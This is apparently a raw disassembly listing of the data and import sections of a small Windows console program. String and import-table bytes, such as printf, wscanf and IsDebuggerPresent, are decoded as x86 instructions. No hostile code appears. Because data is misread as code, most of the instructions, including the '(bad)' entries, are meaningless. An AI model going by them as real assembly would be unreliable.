add    %al,(%eax)
gs jb  0x402255
and    %ah,0x74(%ecx)
and    %ch,0x63(%edi,%ebp,2)
and    %dh,(%ebx)
or     (%eax),%al
add    %al,(%eax)
push   %ebp
add    %dh,0x0(%ebx)
add    %dh,%gs:0x0(%edx)
and    %al,(%eax)
outsb  %ds:(%esi),(%dx)
add    %ah,0x0(%ecx)
insl   (%dx),%es:(%edi)
add    %ah,0x0(%ebp)
cmp    (%eax),%al
and    %al,(%eax)
and    $0xa007300,%eax
add    %al,(%eax)
add    %al,(%eax)
add    %ah,0x72(%ebp)
jb     0x402234
popa   
je     0x402237
insb   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
arpl   %sp,(%eax)
xor    $0xa,%al
add    %al,(%eax)
add    %al,0x0(%ebx)
cmp    (%eax),%al
pop    %esp
add    %al,0x6f(%eax,%eax,1)
add    %ah,0x0(%ebx)
jne    0x40222e
insl   (%dx),%es:(%edi)
add    %ah,0x0(%ebp)
outsb  %ds:(%esi),(%dx)
add    %dh,0x73(%eax,%eax,1)
add    %ah,(%eax)
add    %ah,0x0(%ecx)
outsb  %ds:(%esi),(%dx)
add    %ah,0x20(%eax,%eax,1)
add    %dl,0x0(%ebx)
add    %dh,%gs:0x74(%eax,%eax,1)
add    %ch,0x0(%ecx)
outsb  %ds:(%esi),(%dx)
add    %ah,0x0(%edi)
jae    0x402252
pop    %esp
add    %al,(%eax)
add    %al,(%eax)
add    %bl,0x53(%eax,%eax,1)
add    %dh,0x61(%eax,%eax,1)
add    %dh,0x0(%edx)
je     0x402264
and    %al,(%eax)
dec    %ebp
add    %ah,0x0(%ebp)
outsb  %ds:(%esi),(%dx)
add    %dh,0x0(%ebp)
pop    %esp
add    %dl,0x0(%eax)
jb     0x402274
outsl  %ds:(%esi),(%dx)
add    %ah,0x0(%edi)
jb     0x40227a
popa   
add    %ch,0x0(%ebp)
jae    0x402280
pop    %esp
add    %dl,0x0(%ebx)
je     0x402286
popa   
add    %dh,0x0(%edx)
je     0x40228c
jne    0x40228e
jo     0x402290
pop    %esp
add    %ch,0x0(%ebp)
popa   
add    %ch,0x77(%eax,%eax,1)
add    %ah,0x0(%ecx)
jb     0x40229e
add    %ch,%gs:(%esi)
add    %ah,0x0(%ebp)
js     0x4022a6
add    %al,%gs:(%eax)
add    %al,(%eax)
add    %ah,0x72(%ebp)
jb     0x4022d0
popa   
je     0x4022d3
insb   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
arpl   %sp,(%eax)
xor    $0xa,%eax
add    %al,(%eax)
add    %al,(%eax)
arpl   %ax,(%eax)
outsl  %ds:(%esi),(%dx)
add    %dh,0x0(%eax)
imul   $0x640065,(%eax),%eax
and    %al,(%eax)
je     0x4022d0
outsl  %ds:(%esi),(%dx)
add    %ah,(%eax)
add    %dh,0x0(%ebp)
jae    0x4022d8
add    %dh,%gs:0x0(%edx)
daa    
add    %dh,0x0(%ebx)
and    %al,(%eax)
jae    0x4022e4
je     0x4022e6
popa   
add    %dh,0x0(%edx)
je     0x4022ec
jne    0x4022ee
jo     0x4022f0
and    %al,(%eax)
data16 add %ch,0x0(%edi)
insb   (%dx),%es:(%edi)
add    %ah,0x65(%eax,%eax,1)
add    %dh,0x0(%edx)
or     (%eax),%al
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
dec    %eax
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
xor    %al,0x0(%eax)
shlb   (%ebx)
inc    %eax
add    %al,(%edx)
add    %al,(%eax)
add    %dl,0x53(%edx)
inc    %esp
push   %ebx
aad    $0xfb
cmp    %ss:(%eax),%dh
sub    %bl,%ah
inc    %esp
xchg   %eax,%edx
pushf  
out    %al,$0x57
aad    $0x12
dec    %ebp
ret    $0x1
add    %al,(%eax)
inc    %ebx
cmp    0x6f(%esp,%eax,2),%bl
arpl   %si,0x6d(%ebp)
outsb  %gs:(%esi),(%dx)
je     0x4023e7
and    %ah,0x6e(%ecx)
and    %dl,%fs:0x65(%ebx)
je     0x4023f1
imul   $0x69565c73,0x67(%esi),%ebp
jbe    0x4023eb
imul   $0x20,0x79(%ebp,%ecx,2),%ebx
inc    %esp
outsl  %ds:(%esi),(%dx)
arpl   %si,0x6d(%ebp)
outsb  %gs:(%esi),(%dx)
je     0x402407
pop    %esp
push   %esi
imul   $0x53206c61,0x75(%ebx),%esi
je     0x402414
imul   $0x38303032,%fs:0x20(%edi),%ebp

pop    %esp
push   %eax
jb     0x40241a
push   $0x65
arpl   %si,0x5c(%ebx,%esi,2)
push   %esp
gs insl (%dx),%es:(%edi)
jo     0x402422
popa   
je     0x40241e
pop    %esp
push   %edx
gs insb (%dx),%es:(%edi)
gs popa 
jae    0x402426
pop    %esp
push   %esp
gs insl (%dx),%es:(%edi)
jo     0x402433
popa   
je     0x40242f
jo,pn  0x402431
bound  %eax,(%eax)
add    %dh,0x400001a(%ebp)
sbb    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %bh,%dh
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %dl,%al
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %bh,%dh
(bad)  
(bad)  
call   *0x15(%ebp)
inc    %eax
add    %ch,0x15(%ecx)
inc    %eax
add    %al,(%eax)
add    %al,(%eax)
add    %bh,%dh
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %cl,%ah
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %bh,%dh
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %cl,0x4018(%eax)
add    %al,(%eax)
add    %bh,%dh
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %bl,%al
(bad)  
(bad)  
incl   (%eax)
add    %al,(%eax)
add    %bh,%dh
(bad)  
(bad)  
lcall  *(%ebx)
sbb    0x0(%eax),%al
das    
sbb    0x0(%eax),%al
(bad)  
(bad)  
(bad)  
call   *%esp
sbb    0x0(%eax),%eax
add    %al,(%eax)
add    %al,(%eax)
loopne 0x40246d
inc    %eax
add    %al,(%ecx)
add    %al,(%eax)
add    %ch,%ah
sbb    0x0(%eax),%eax
add    (%eax),%al
add    %al,(%eax)
clc    
sbb    0x0(%eax),%eax
and    0x41993,%al
add    %al,(%eax)
inc    %esp
and    $0x40,%al
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%ecx)
add    %al,(%eax)
add    %ch,%ah
and    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %ah,%ah
and    $0x20000000,%eax
add    %al,(%eax)
push   %esp
and    $0x0,%eax
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
and    (%esi),%ah
add    %al,(%eax)
push   $0x2c000020
and    $0x0,%eax
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
lock sub %eax,(%eax)
add    %al,0x20(%eax)
add    %al,(%eax)
hlt    
and    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %bl,(%esi)
sub    (%eax),%eax
add    %cl,(%eax)
and    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %dl,%ah
and    $0x0,%eax
add    %al,(%eax)
add    $0x2b,%al
add    %al,(%eax)
out    %al,(%dx)
sub    (%eax),%al
add    %bl,%al
sub    (%eax),%al
add    %cl,%al
sub    (%eax),%al
add    %ch,-0x65ffffd6(%esi)
sub    (%eax),%al
add    %bh,0x0(%edx,%ebp,1)
add    %ah,0x2a(%eax)
add    %al,(%eax)
dec    %esp
sub    (%eax),%al
add    %bh,(%eax)
sub    (%eax),%al
add    %bl,(%edx)
sub    (%eax),%al
add    %dl,(%edx)
sub    (%eax),%al
add    %bh,%ah
sub    %eax,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %bh,0x28(%eax)
add    %al,(%eax)
mov    $0x29,%ah
add    %al,(%eax)
js     0x40255f
add    %al,(%eax)
sub    %eax,%ss:(%eax)
add    %dh,%ah
sub    %al,(%eax)
add    %bh,0x3a000028(%eax)
sub    %al,(%eax)
add    %bh,%dl
daa    
add    %al,(%eax)
mov    $0x27,%esp
add    %al,(%eax)
add    %bl,-0x7fffffda(%esi)
daa    
add    %al,(%eax)
outsb  %ds:(%esi),(%dx)
daa    
add    %al,(%eax)
fs daa 
add    %al,(%eax)
pop    %esp
daa    
add    %al,(%eax)
dec    %esi
daa    
add    %al,(%eax)
inc    %esp
daa    
add    %al,(%eax)
mov    $0x26,%ah
add    %al,(%eax)
xor    %ah,(%edi)
add    %al,(%eax)
sbb    (%edi),%ah
add    %al,(%eax)
or     %ah,(%edi)
add    %al,(%eax)
mulb   (%esi)
add    %al,(%eax)
call   0xd84025af
add    %al,%es:(%eax)
enter  $0x26,$0x0
lods   %ds:(%esi),%al
daa    
add    %al,(%eax)
nop
add    %al,%es:(%eax)
test   %ah,(%esi)
add    %al,(%eax)
jbe    0x4025c4
add    %al,(%eax)
outsb  %ds:(%esi),(%dx)
add    %al,%es:(%eax)
pusha  
add    %al,%es:(%eax)
pop    %eax
add    %al,%es:(%eax)
dec    %esi
add    %al,%es:(%eax)
cmp    $0x26,%al
add    %al,(%eax)
cs add %al,%es:(%eax)
push   %ss
add    %al,%es:(%eax)
or     $0x26,%al
add    %al,(%eax)
add    (%esi),%ah
add    %al,(%eax)
repnz and $0x279a0000,%eax
add    %al,(%eax)
sub    $0x2b,%al
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
pop    %edi
add    %eax,0x65(%edi)
je     0x40262f
jae    0x402641
jb     0x40262c
popa   
insl   (%dx),%es:(%edi)
gs push %edi
add    %al,(%eax)
inc    %ecx
inc    %esp
push   %esi
inc    %ecx
push   %eax
dec    %ecx
xor    (%edx),%esi
cs fs insb (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
add    %al,(%eax)
pop    %ds
add    %bh,(%edi)
aas    
pop    %edi
push   %ebp
inc    %eax
pop    %ecx
inc    %ecx
push   %eax
inc    %ecx
pop    %eax
dec    %ecx
inc    %eax
pop    %edx
add    %ch,(%esi)
add    $0x6e697270,%eax
je     0x402670
add    %al,(%eax)
cmpsb  %es:(%edi),%ds:(%esi)
add    $0x69727077,%eax
outsb  %ds:(%esi),(%dx)
je     0x40267b
add    %bl,0x73637705(%edi)
je     0x40268c
insl   (%dx),%es:(%edi)
bound  %esi,0x0(%ebx)
add    %cl,0x53(%ebp)
push   %esi
inc    %ebx
push   %edx
cmp    %esi,(%eax)
cs fs insb (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
add    %dl,0x6d615f01
jae    0x40269c
pop    %edi
gs js  0x4026a2
je     0x40263b
add    %dh,%bh
add    %bl,0x5f(%edi)
ja     0x4026a9
gs je  0x4026b2
popa   
imul   $0x736772,0x61(%esi),%ebp
add    %ch,(%ecx,%eax,1)
pop    %edi
arpl   %sp,0x78(%ebp)
imul   $0x655f017c,0x0(%eax,%eax,1),%esi

js     0x4026c7
je     0x402660
data16 add %bl,0x58(%edi)
arpl   %si,0x74(%eax)
inc    %esi
imul   $0x4cc0072,0x65(%esp,%esi,2),%ebp

gs js  0x4026dc
je     0x402675
add    %bh,%al
add    %bl,0x5f(%edi)
ja     0x4026e5
outsb  %ds:(%esi),(%dx)
imul   $0x4000076,0x6e(%ebp,%eiz,2),%esi

add    0x69(%edi),%bl
outsb  %ds:(%esi),(%dx)
imul   $0x5006d72,0x65(%esp,%esi,2),%esi

add    0x69(%edi),%bl
outsb  %ds:(%esi),(%dx)
imul   $0x655f6d72,0x65(%esp,%esi,2),%esi

add    %bh,(%ecx,%eax,1)
pop    %edi
arpl   %bp,0x6e(%edi)
imul   $0x7268,0x74(%edi),%sp
gs popa 
fs insb (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
arpl   %sp,0x6c(%ecx)
gs add %ah,%bl
add    %bl,0x5f(%edi)
jae    0x40271f
je     0x402731
jae    0x402723
jb     0x40272d
popa   
je     0x40272b
gs jb  0x402738
add    %al,(%eax)
or     (%ecx),%eax
pop    %edi
popa   
fs push $0x75
jae    0x402745
pop    %edi
imul   $0xcb00,%fs:0x0(%esi),%si
add    %bl,0x5f(%edi)
jo     0x40273d
pop    %edi
arpl   %bp,0x6d(%edi)
insl   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
fs add %al,%gs:(%eax)
iret   
add    %bl,0x5f(%edi)
jo     0x40274d
pop    %edi
insw   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
fs add %al,%gs:(%eax)
push   $0x1
pop    %edi
outsb  %gs:(%esi),(%dx)
arpl   %bp,0x64(%edi)
gs pop %edi
jo     0x402771
imul   $0xe0007265,0x74(%esi),%ebp
add    %bl,0x5f(%edi)
jae    0x402773
je     0x40276f
popa   
jo     0x402783
pop    %edi
je     0x40278f
jo     0x40277d
add    %al,(%eax)
dec    %ebx
add    %ebx,0x63(%edi)
jb     0x402794
pop    %edi
fs bound %esi,%gs:0x67(%ebp)
addr16 gs jb 0x402789
push   $0x6b6f6f
add    %al,0x0(%ebx)
aas    
je     0x40279a
jb     0x4027a4
imul   $0x40406574,0x61(%esi),%ebp
pop    %ecx
inc    %ecx
pop    %eax
pop    %eax
pop    %edx
add    %ah,%dh
add    0x75(%edi),%ebx
outsb  %ds:(%esi),(%dx)
insb   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
arpl   %bp,0x0(%ebx)
xchg   %eax,%esi
add    %bl,0x5f(%edi)
fs insb (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
gs js  0x4027c3
je     0x40275c
jbe    0x402760
pop    %edi
insb   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
arpl   %bp,0x0(%ebx)
sbb    $0x3,%al
pop    %edi
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
gs js  0x4027d5
je     0x40276e
pusha  
add    %ebx,0x64(%edi)
arpl   %bp,%gs:0x64(%edi)
gs pop %edi
jo     0x4027e9
imul   $0x73007265,0x74(%esi),%ebp
add    %ebx,0x65(%edi)
js     0x4027e9
gs jo  0x4027fd
pop    %edi
push   $0x6c646e61
gs jb  0x4027c6
pop    %edi
arpl   %bp,0x6d(%edi)
insl   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
add    %cl,(%ebx)
add    0x69(%edi),%bl
outsb  %ds:(%esi),(%dx)
jbe    0x402810
imul   $0x77,0x5f(%ebp),%esp
popa   
je     0x40281b
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
add    %al,(%eax)
aas    
add    %ebx,0x63(%edi)
outsl  %ds:(%esi),(%dx)
outsb  %ds:(%esi),(%dx)
je     0x402826
outsl  %ds:(%esi),(%dx)
insb   (%dx),%es:(%edi)
data16 jo 0x402818
jae    0x4027bb
add    %ah,0x6(%ebx)
aas    
arpl   %bp,0x73(%edi,%ebp,2)
gs inc %eax
aas    
and    $0x62,%al
popa   
jae    0x402834
arpl   %bx,0x6f(%edi)
data16 jae 0x402845
jb     0x402838
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x402843
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x402864
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
pop    %eax
pop    %eax
pop    %edx
add    %cl,0x1(%edi)
aas    
aas    
xor    %bh,(%edi)
and    $0x62,%al
popa   
jae    0x40286e
arpl   %bx,0x6f(%edi)
data16 jae 0x40287f
jb     0x402872
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x40287d
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x40289e
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
inc    %eax
push   %eax
inc    %edx
inc    %esp
dec    %eax
dec    %eax
inc    %eax
pop    %edx
add    %al,(%eax)
pusha  
push   %es
aas    
arpl   %bp,0x73(%edi,%ebp,2)
gs inc %eax
aas    
and    $0x62,%al
popa   
jae    0x4028b2
arpl   %bx,0x69(%edi)
data16 jae 0x4028c3
jb     0x4028b6
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x4028c1
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x4028e2
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
pop    %eax
pop    %eax
pop    %edx
add    %ch,(%edx)
add    %edi,(%edi)
aas    
xor    %bh,(%edi)
and    $0x62,%al
popa   
jae    0x4028ec
arpl   %bx,0x69(%edi)
data16 jae 0x4028fd
jb     0x4028f0
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x4028fb
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x40291c
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
inc    %eax
push   %eax
inc    %edx
pop    %edi
push   %edi
dec    %eax
dec    %eax
inc    %eax
pop    %edx
add    %al,0x8(%ebp)
aas    
addr16 gs je 0x4028ff
aas    
and    $0x62,%al
popa   
jae    0x40292e
arpl   %bx,0x69(%edi)
jae    0x40293e
jb     0x402931
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x40293c
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x40295d
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
dec    %eax
pop    %eax
pop    %edx
add    %al,(%eax)
xor    %cl,(%eax)
aas    
data16 insb (%dx),%es:(%edi)
jne    0x40296e
push   $0x62243f40
popa   
jae    0x40296c
arpl   %bx,0x6f(%edi)
jae    0x40297c
jb     0x40296f
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x40297a
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x40299b
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
inc    %ecx
inc    %ecx
push   %esi
xor    %esi,(%edx)
inc    %eax
pop    %eax
pop    %edx
add    %bl,0xa(%ebx)
aas    
jo     0x4029b0
je     0x40297d
aas    
and    $0x62,%al
popa   
jae    0x4029ac
arpl   %bx,0x6f(%edi)
jae    0x4029bc
jb     0x4029af
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x4029ba
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x4029db
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
inc    %ecx
inc    %ecx
push   %esi
xor    %esi,(%edx)
inc    %eax
inc    %esp
inc    %eax
pop    %edx
add    %al,(%eax)
add    $0x5f3f3f04,%eax
inc    %esp
aas    
and    $0x62,%al
popa   
jae    0x4029ed
arpl   %bx,0x6f(%edi)
data16 jae 0x4029fe
jb     0x4029f1
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x4029fc
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x402a1d
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
pop    %eax
pop    %eax
pop    %edx
add    %al,(%eax)
stc    
add    (%edi),%edi
aas    
pop    %edi
inc    %esp
aas    
and    $0x62,%al
popa   
jae    0x402a29
arpl   %bx,0x69(%edi)
data16 jae 0x402a3a
jb     0x402a2d
popa   
insl   (%dx),%es:(%edi)
inc    %eax
inc    %esp
push   %ebp
aas    
and    $0x63,%al
push   $0x745f7261
jb     0x402a38
imul   $0x74734044,0x40(%ebx,%esi,2),%esi

fs inc %eax
inc    %eax
inc    %eax
jae    0x402a59
fs inc %eax
inc    %eax
push   %ecx
inc    %ecx
inc    %ebp
pop    %eax
pop    %eax
pop    %edx
add    %al,(%eax)
dec    %ebp
push   %ebx
push   %esi
inc    %ebx
push   %eax
cmp    %esi,(%eax)
cs fs insb (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
add    %bh,0x746e4902(%ebp)
gs jb  0x402a70
outsl  %ds:(%esi),(%dx)
arpl   %bp,0x65(%ebx)
fs inc %ebp
js     0x402a6f
push   $0x65676e61
add    %ah,(%ecx)
add    $0x53,%al
insb   (%dx),%es:(%edi)
gs gs jo 0x402a1a
mov    $0x746e4902,%edx
gs jb  0x402a8e
outsl  %ds:(%esi),(%dx)
arpl   %bp,0x65(%ebx)
fs inc %ebx
outsl  %ds:(%esi),(%dx)
insl   (%dx),%es:(%edi)
jo     0x402a8d
jb     0x402a93
inc    %ebp
js     0x402a94
push   $0x65676e61
add    %al,(%eax)
sub    $0x72655404,%eax
insl   (%dx),%es:(%edi)
imul   $0x72506574,0x61(%esi),%ebp
outsl  %ds:(%esi),(%dx)
arpl   %sp,0x73(%ebp)
jae    0x402a4b
add    %ch,0x74654701(%ecx)
inc    %ebx
jne    0x402ac6
jb     0x402abb
outsb  %ds:(%esi),(%dx)
je     0x402aa9
jb     0x402aca
arpl   %sp,0x73(%ebp)
jae    0x402a60
ds add $0x55,%al
outsb  %ds:(%esi),(%dx)
push   $0x6c646e61
gs fs inc %ebp
js     0x402ad1
gs jo  0x402ae5
imul   $0x746c6946,0x6e(%edi),%ebp
gs jb  0x402a7b
add    %dl,0x74655304
push   %ebp
outsb  %ds:(%esi),(%dx)
push   $0x6c646e61
gs fs inc %ebp
js     0x402af0
gs jo  0x402b04
imul   $0x746c6946,0x6e(%edi),%ebp
gs jb  0x402a9a
roll   (%edx)
dec    %ecx
jae    0x402ae3
bound  %esi,%gs:0x67(%ebp)
addr16 gs jb 0x402af7
jb     0x402b0e
jae    0x402b10
outsb  %ds:(%esi),(%dx)
je     0x402aae
push   %esp
add    0x75(%ecx),%edx
gs jb  0x402b2e
push   %eax
gs jb  0x402b1f
outsl  %ds:(%esi),(%dx)
jb     0x402b29
popa   
outsb  %ds:(%esi),(%dx)
arpl   %sp,0x43(%ebp)
outsl  %ds:(%esi),(%dx)
jne    0x402b32
je     0x402b2b
jb     0x402ac8
data16 add 0x65(%edi),%al
je     0x402b22
imul   $0x6e756f43,0x6b(%ebx),%esp
je     0x402ad7
add    %ch,0x74654701(%ebp)
inc    %ebx
jne    0x402b52
jb     0x402b47
outsb  %ds:(%esi),(%dx)
je     0x402b39
push   $0x64616572
dec    %ecx
add    %al,%fs:(%eax)
stos   %al,%es:(%edi)
add    %eax,0x65(%edi)
je     0x402b37
jne    0x402b68
jb     0x402b5d
outsb  %ds:(%esi),(%dx)
je     0x402b4b
jb     0x402b6c
arpl   %sp,0x73(%ebp)
jae    0x402b4b
add    %cl,%fs:0x2(%edi)
inc    %edi
gs je  0x402b5d
jns    0x402b7f
je     0x402b73
insl   (%dx),%es:(%edi)
push   %esp
imul   $0x69467341,0x65(%ebp),%ebp
insb   (%dx),%es:(%edi)
gs push %esp
imul   $0x52454b00,0x65(%ebp),%ebp
dec    %esi
inc    %ebp
dec    %esp
xor    (%edx),%esi
cs fs insb (%dx),%es:(%edi)
insb   (%dx),%es:(%edi)
add    %al,(%eax)
jae    0x402b2e
pop    %edi
pop    %edi
inc    %ebx
js     0x402bab
inc    %esi
jb     0x402b97
insl   (%dx),%es:(%edi)
gs dec %eax
popa   
outsb  %ds:(%esi),(%dx)
fs insb (%dx),%es:(%edi)
gs jb  0x402b73
add    %al,(%eax)




dec    %esi
out    %al,$0x40
mov    $0x44bf19b1,%ebx
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
(bad)  
incl   (%ecx)
add    %al,(%eax)
add    %dh,(%ecx,%eiz,1)
inc    %eax
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
